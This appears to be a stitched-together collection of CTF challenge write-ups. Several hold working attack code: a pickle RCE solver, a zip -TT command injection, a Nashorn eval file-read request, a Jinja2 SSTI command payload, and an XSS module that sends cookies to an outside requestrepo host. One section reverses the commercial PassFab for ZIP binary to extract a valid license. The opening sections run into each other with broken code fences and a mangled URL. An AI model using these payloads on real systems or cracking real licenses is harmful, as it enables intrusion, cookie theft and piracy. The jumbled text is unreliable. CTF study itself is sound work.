Description:

```
It's a dumpster dive like no other, where the trash talk is just as valuable as the treasures you uncover. Get ready to rummage for the ultimate prize!

Flag format: CTF{sha256}
```

We can get RCE by deserializing Pickle objects in Python. The flag is "deleted", but we can see it in the command line of other processes :)

Solver script:
```py
from pwn import *

sh = remote('35.246.182.143', 32273)

import pickle
import base64
import requests
import sys

class PickleRCE(object):
    def __reduce__(self):
        return (exec,(command,))

command = 'import os; print(os.popen("ps -aux").read())'

payload = base64.b64encode(pickle.dumps(PickleRCE()))  # Crafting Payload

sh.sendlineafter(b'I want to', payload)
sh.interactive()
```

Resource: https://github.com/b3taflash/friendly-colabs

*PS: The flag from index.php test-version repository isn't correct, ignore it. Find the real one, will be obvious when you'll find it.*
```

We have an access token for the b3taflash account. We'll use it to authenticate ourselves and clone the repository  [https://github.com/b3taflash/friendly-colabs](https://github.com/b3taflash/friendly-colabs), where we'll find parts 1 and 2 of the flag. Part 3 is found in the repository [https://github.com/danielpopovici16/secret.git](https://github.com/danielpopovici16/secret.git)

* Find the access token (encoded in base64) in this commit: [https://github.com/danielpopovici16/source-colab/commit/3b8d10494c97ad1ef147e66b0d97d76e409983fe](https://github.com/danielpopovici16/source-colab/commit/3b8d10494c97ad1ef147e66b0d97d76e409983fe) and use it with the git command-line tool to clone the repository [https://github.com/b3taflash/friendly-colabs](https://github.com/b3taflash/friendly-colabs)
* The repository seems empty at first, but we can see a pack of objects using `find .`:
   ```

## rtfm (315 pts, 38 solves) - Misc

Description:

```
Let me tell you this..... you really need to read the manual.
```

I read the manual and solved it :). The idea is that we can control an argument in the zip command, and using -T and -TT we can execute shell functions.

```
(base) ~/Desktop/ctf/from-memory nc  35.246.209.188 31718
-TDTT/bin/sh -c ./f* 2>&1
Zip me: updating: test_file (stored 0%)
./flag.txt: 1: Flag_Chaining_FTW: not found

test of test.zip FAILED

zip error: Zip file invalid, could not spawn unzip, or wrong unzip (original files unmodified)
```

The -D flag was added because we needed a way to tell zip to differentiate between T and TT flags.

Eval stuff everywhere. What is going on?
```

**Summary**
We can execute JavaScript in Java through command injection using '. The problem is that it's not standard JavaScript; it uses the Nashorn engine. This means we can't use typical Node.js gadgets to get a shell or read files. Fortunately, there's a StackOverflow answer for this:
[https://stackoverflow.com/questions/67668010/in-the-nashorn-javascript-engine-how-can-i-read-a-file-from-the-file-system](https://stackoverflow.com/questions/67668010/in-the-nashorn-javascript-engine-how-can-i-read-a-file-from-the-file-system)

**Proof of Solution**
```
GET /index.jsp?eval='%2ba();function+a()%7bvar+pathObj=java.nio.file.Paths.get('/home/ctf/flag.txt');var+bytesObj=java.nio.file.Files.readAllBytes(pathObj);var+bytes=Java.from(bytesObj);return+String.fromCharCode.apply(null,bytes);%7d;// HTTP/1.1

```

**Explanation**

* **Vulnerability:** There's a Java application that's vulnerable to command injection. An attacker can inject JavaScript code into a command executed by the application.
* **Nashorn Engine:**  The Java application isn't using standard JavaScript, but rather the Nashorn engine. This makes typical file reading and command execution techniques used with Node.js ineffective.
* **Solution:** The StackOverflow answer provides a custom JavaScript function that can be used specifically with the Nashorn engine to read files:
    * **java.nio.file.Paths.get('/home/ctf/flag.txt'):** Constructs a file path object pointing to the target file.
    * **java.nio.file.Files.readAllBytes(pathObj):** Reads the contents of the file into a byte array.
    * **Java.from(bytesObj):** Helps the Nashorn engine handle Java data types.
    * **String.fromCharCode.apply(null, bytes):** Converts the file's bytes into a string.
* **Exploit:** The provided HTTP request shows the attacker exploiting the vulnerability. The `eval` parameter takes JavaScript code encoded in URL encoding (%2b, etc.). This code defines the file-reading function and then executes it, likely revealing the flag.

## grocery-list (280 pts, 45 solves) - Web

Description:

```
"Ehm...milk...eggs...what else? WHAT ELSE?!"

Day after day i just could not remember all the stuff i was planning to buy.

No more! Now I've made myself my own grocery list website! And wait, there's more: IT'S HACKER PROOF

Is you memory as volatile as mine? Maybe you should use the my web app...
```

In this scenario, we exploit an SSTI (Server-Side Template Injection) vulnerability in a Flask/Jinja2 application lacking proper restrictions. The goal is to execute arbitrary commands on the server or read sensitive files.

**Proof of Concept:**

After some exploration, I crafted the following payload:

```jinja2
{{ '{%' }} for key, value in cycler|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")|attr("items")() %}
    {{ '{%' }} if key == "\x6f\x73" %}
    {{ value|attr("p\x6fpen")("cat f*")|attr("read")() }}
    {{ '{%' }} endif %}
{{ '{%' }} endfor %}
```

**Explanation:**

1. **Iterating through __globals__:** We loop through key-value pairs within the global `__globals__` dictionary.
2. **Targeting the 'os' module:** We search for the key `"os"`, which represents the Python 'os' module.
3. **Command Execution:** The `attr` function is used to call the `popen` method from the 'os' module. We execute the command `cat f*`, which lists all files starting with 'f' in the current directory.
4. **Reading Output:** Using `attr` again, we call the `read` method to capture the output of the `cat` command.

**Additional Notes:**

* The `\x` characters in the strings are used to bypass potential restrictions that the application might have in place.
* This payload demonstrates both command execution and the ability to read files from the server.

Basic questions about the given rev / windows binary. I used Binary Ninja for decompilation, but any decompiler like IDA/Ghidra would have worked.

1. `VCRUNTIME140_1.dll` is a known Windows DLL, and it is one of the files that we can download from the challenge, so the answer is `dll-hijacking`
2. We can just check the strings and look for any string that looks like an SQL query ![query](/assets/images/posts/sqlwmi.png)
3. In the DLL, we can see how the flag is initialized character by character: ![flag_binary_illusions](/assets/images/posts/binaryillusions.png)

**Summary:**

This goal of the challenge is to generate a valid license for the PassFab Zip program.

**Proof of Concept:**

1. **Extract the binaries:**
    * The program uses Inno Setup for installation.
    * We use InnoUnpacker-Windows-GUI to extract the relevant binaries.
    * The binary of interest is `PassFab for ZIP.exe`.

2. **Reverse engineer the binary:**
    * We reverse engineer the `PassFab for ZIP.exe` binary.
    * We find the function `sub_444C40` that generates and verifies the license.
    * The function generates a valid license and compares it to the user input.

3. **Generate the license:**
    * We set a breakpoint at the `sub_444C40` function.
    * We copy the contents of the buffer that contains the generated license.

**Summary:**

In this challenge we need to recover a flag hidden in an MP3 header. I noticed that the flag was in the MP3 header by opening the file in a hex editor:

![hexeditor](/assets/images/posts/hexeditor.png)

**Proof of Concept:**

1. **Locate the flag:**
    * Open the MP3 file in a hex editor.
    * Search for the flag pattern, which appears to be "Td, Fd, {d".
    * Notice that the flag parts are 576 bytes apart.

2. **Extract the flag:**
    * Write a Python script to automate the extraction process.
    * The script reads the MP3 file and extracts the flag parts at the specified intervals.
    * The script prints the flag characters to the console.

3. **Result:**
    * The script successfully extracts the flag.

```py
t = open('Duck.mp3', 'rb').read()
idx = 622

for i in range(69):
 print(chr(t[idx]), end='')
 idx += 576
```

## Reversing a Windows GUI Application for a Flag

**Summary:**

The challenge requires us to reverse a Windows GUI application to find the flag.

**Proof of Concept:**

1. **Locate the relevant binary:**
    * The binary of interest is `QCM.exe`.

2. **Find the flag check function:**
    * Since there is no exact method to locate flag check functions in GUI applications, we rely on strings and decompilation.
    * The function that checks the flag is located at address `0x1400016f0`.

3. **Analyze the function:**
    * Decompilation reveals that the function splits the input with `-` and checks if the result has a length of 5 (4 `-` characters). ![uicrack1](/assets/images/posts/uicrack1.png)
    * It then performs individual checks on each part of the key:
        * First part is compared to `"RO"`. ![uicrack2](/assets/images/posts/uicrack2.png)
        * Second part is compared to `"CTF"`.
        * Third part is compared to `2024` (after casting to an integer).
        * Fourth part is compared to `"HACKERS"`.
        * Fifth part is compared to `"WINDOWS"`.

4. **Extract the flag:**
    * We use a debugger to dynamically extract the flag.
    * The flag is hashed using SHA-256.

Now that we have the correct input, we can get the flag as follows:
```
>>> hashlib.sha256(b'RO_CTF_2024_HACKERS_WINDOWS').hexdigest()
'165cd3a1c5f03af866353834a5e256170d8f345fbd06c2c6cb43565d1edec5f2'

Description:

```
You have managed to get away with an app and some data encrypted with it. All you know is that there is a passphrase, it starts with R and on the keyboard last used, the CapsLock key was stuck. Can you get the valuable info inside this file?
```

**Summary:**

We are given an ARM binary that decrypts `data.enc` given the correct password.

**Proof of Concept:**

1. **Analyze the binary:**
    * The binary checks if the input password is 9 characters long.
    * It then hashes the password using MD5 and compares the result to a value stored in the binary (in reverse order).

2. **Crack the password:**
    * We can use hashcat to brute-force the MD5 hash.
    * The description provides a hint that the password uses all caps lock.
    * We run the following hashcat command:

```
hashcat -a 3 -m 0 9c3bf72611a2a9aa8b966f28a0696229 --backend-ignore-cuda -1 ?u?d 'R?1?1?1?1?1?1?1?1'
```

3. **Decrypt the file:**
    * The password is `R0C3C2O2A`.
    * We can run `./decryptor.x64 R0C3C2O2A` on a Linux machine with ARM (or a VM) to obtain the flag.

## Cracking a Monoalphabetic Substitution Cipher

**Summary:**
Challenge involves a monoalphabetic substitution cipher with a custom 4-digit encoding.

**Proof of Concept:**

We are given this ciphertext: 
```
02000115    060003300500    0045010000300330004501000045    0445014502000430    000002450245    060003300500    0315010001000045    04450330    00450330    031503300530    02000430    04450330    0145000004300145    02000445    000003150045    0445014500000445    02000430    0600033005000415    0115024500000130
```

1. **Decode the ciphertext:**
    * We replace each group of 4 digits with a corresponding letter.
    * This gives us the partially decoded message: 
        ```
        AB CDE FGJDFGF KLAM NOO CDE HGGF KD FD HDP AM KD LNML AK NHF KLNK AM CDEQ BONR
        ```

2. **Solve the cipher:**
    *  Use a tool like quipqiup ([https://www.quipqiup.com/](https://www.quipqiup.com/)) to automatically break the remaining substitution cipher.

3. **Find the flag:**
    * The instructions in the decoded message tell us to hash the full sentence.
    * Using SHA-256, we hash the message: 
         ```python 
         import hashlib 
         hashlib.sha256(b'IF YOU DECODED THIS ALL YOU NEED TO DO NOW IS TO HASH IT AND THAT IS YOUR FLAG').hexdigest()
         ```

## special-waffle (282 pts, 21 solves) - Threat hunting, Threat intelligence

Description:

```
In the year 2021, as you were on the cusp of drifting into slumber, the abrupt intrusion of a ringing telephone jolted you awake. This disruption signaled the emergence of a cybersecurity incident demanding your immediate attention and expertise across various critical aspects.

You should access the 1* index , events are logged from 3 years ago.
```

**Summary:**

This challenge involves identifying threats by analyzing logs stored in Kibana.

**Proof of Concept:**

1. **Identifying Local Source:**

* Since we only have network events, we select a source IP that appears to be local.

2. **Filtering by DNS and HTTP:**

* We filter by `dns_query` and `http_payload` to identify suspicious requests.
* We observe suspicious POST requests to `test.dirigu.ro`.

3. **Filtering by GET Requests:**

* We further filter by GET requests to refine the analysis. ![kibana](/assets/images/posts/kibana.png)

4. **Identifying the Threat:**

* The logs lead us to "Squirelwaffle".
* Therefore, "waffle" is the answer to the question posed.

## android-echoes (255 pts, 50 solves) - Mobile

Description:

```
Someone has sent you a mysterious message, containing an Android mobile application.
You set an emulated environment, make a coffee and start to analyze the application to find the secrets inside it.
```

**Summary:**

The challenge involves an Android application with a vulnerable broadcast receiver, but the though the flag algorithm is relatively simple and can be solved statically.

**Proof of Concept:**

1. **Decompile the application:**

* Decompile the application to obtain the source code. ![android](/assets/images/posts/android.png)

2. **Analyze the flag generation code:**

* Locate the code that generates the flag.
* In this case, the flag is simply a concatenation of strings from the `generateObfuscatedResourceNames()` function.

3. **Extract the flag strings:**

* Extract the flag strings from the `res/values/strings.xml` file.
```
./resources/res/values/strings.xml:    <string name="obf_a1b2c">Njk2ZGUz</string>
./resources/res/values/strings.xml:    <string name="obf_d3e4f">YzQyZjBl</string>
./resources/res/values/strings.xml:    <string name="obf_g5h6i">OWMyNWVm</string>
./resources/res/values/strings.xml:    <string name="obf_j7k8l">YzBjZTQ5</string>
./resources/res/values/strings.xml:    <string name="obf_m9n0o">MzdkMzFm</string>
./resources/res/values/strings.xml:    <string name="obf_p1q2r">NTFlNGJj</string>
./resources/res/values/strings.xml:    <string name="obf_s3t4u">NjU3ZmMy</string>
./resources/res/values/strings.xml:    <string name="obf_v5w6x">ZmNkZTU4</string>
./resources/res/values/strings.xml:    <string name="obf_y7z8a">Y2ZlMDQ1</string>
./resources/res/values/strings.xml:    <string name="obf_b9c0d">YjkyYmQx</string>
```
* The strings are obfuscated, but they can be easily deobfuscated.

4. **Concatenate the strings and decode the flag:**

* Concatenate the strings in the order specified by the `generateObfuscatedResourceNames()` function.
* The result is: `Njk2ZGUzYzQyZjBlOWMyNWVmYzBjZTQ5MzdkMzFmNTFlNGJjNjU3ZmMyZmNkZTU4Y2ZlMDQ1YjkyYmQx`
* Decode the base64-encoded flag to obtain the final flag.

Description:

```
Batman receives a secret letter from Joker. Taking into consideration their past, for sure something is stinky in there. Can you find what? It seems that a photo with a bat is the problem.


Flag format: CTF{sha256(message)}
```

**Summary:**

The challenge involves cracking a WPA2 password using aircrack-ng, and then recovering a hidden message from an image using stegseek.

**Proof of Concept:**

1. **Crack the WPA2 password:**

* Use aircrack-ng to crack the WPA2 password from the captured pcap file.
* Use a dictionary attack with the provided hint (extract Joker-related words from `rockyou.txt`).
* The command is: `aircrack-ng -a2 -w crack.txt joker_hack-01\ \(custom\ batman\ story\).cap`
* The password is `Joker4life`.

2. **Decrypt the traffic:**

* Use Wireshark to decrypt the captured traffic using the cracked password.
* You will see HTTP traffic.

3. **Extract interesting objects:**

* Use Wireshark to dump interesting objects.
* Two interesting objects are `%2f` (a letter from Batman to Joker) and `bat-logo.jpeg`.

4. **Extract hidden message from the image:**

* Use stegseek to extract the hidden message from the image.
* The first hint suggests that the password for steghide is in the letter.
* Extract all words from the letter using the command: `cat '%2f' | grep -E '\b\w+\b' -o`
* The password is `Harlequinof`.
* Use stegseek to extract the hidden message with the command: `stegseek --seed Harlequinof bat-logo.jpeg`
* The flag is revealed.

Description:

```
Cool upload server which allows you to report interesting files to the admin, but as he wanted
some fancy javascript animations on the site he missed something.
Find what's wrong coded and steal the secrets.
```

**Summary**

**XSS Challenge**

**Proof of Solution**

We observe that we can upload files, but not with the .js extension:
```js
// Do not allow any js files 
function isNotJsExtension(filePath) {
  const extension = path.extname(filePath);
  return extension.toLowerCase() !== '.js';
}
```

We also have nosniff:
```js
// uhh sniffing...
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  next();
});
```

Therefore, we cannot use images for JavaScript files.

And finally, we have a custom route:
```js
app.get('/custom', (req, res) => {
  let text = req.query.text;
  if (text) {
    // Sanitize the text input to ensure it's safe to use in the output
    text = sanitizeHtml(text, {
      allowedTags: [], 
      allowedAttributes: {} // Do not allow any HTML attributes / tags
    });

    // Use the sanitized text
    res.send(`You entered: ${text}
      <script src="http://localhost:8080${text}"></script>
    `);
  } else {
    res.send('Please provide the name of the js in the query parameter. For example, ?text=hello_rocsc2024.js');
  }
});
```

Which we will use to achieve XSS. Even if .js is not allowed, .mjs is, and it will have the same Content-Type as .js. We can leverage this to achieve XSS.

**lol.mjs:**
```js
location = "//06sjnkhn.requestrepo.com/?flag= [invalid URL removed]" + document.cookie;
```

Then, we can report to the URL http://localhost:8080/custom?text=/public/uploads/local-lol.mjs and get the flag:
![coolupload](/assets/images/posts/coolupload.png)

**Explanation**

The provided code demonstrates a vulnerable web application that allows for a Cross-Site Scripting (XSS) attack. Here's how it works:

1. **File Upload Restriction:** The application attempts to prevent the direct upload of JavaScript files (.js)
2. **Content-Type Misinterpretation:** The `nosniff` header is meant to prevent browsers from guessing file types, but it's not perfect.
3. **Vulnerable Custom Route:** The `/custom` route takes user input and directly reflects it within a `<script>` tag. Insufficient sanitization makes it vulnerable.
4. **XSS Payload:** The attacker uploads a file named `lol.mjs`. Modern browsers execute `.mjs` files as JavaScript. The payload redirects the victim's browser to an external site, sending the victim's cookies.
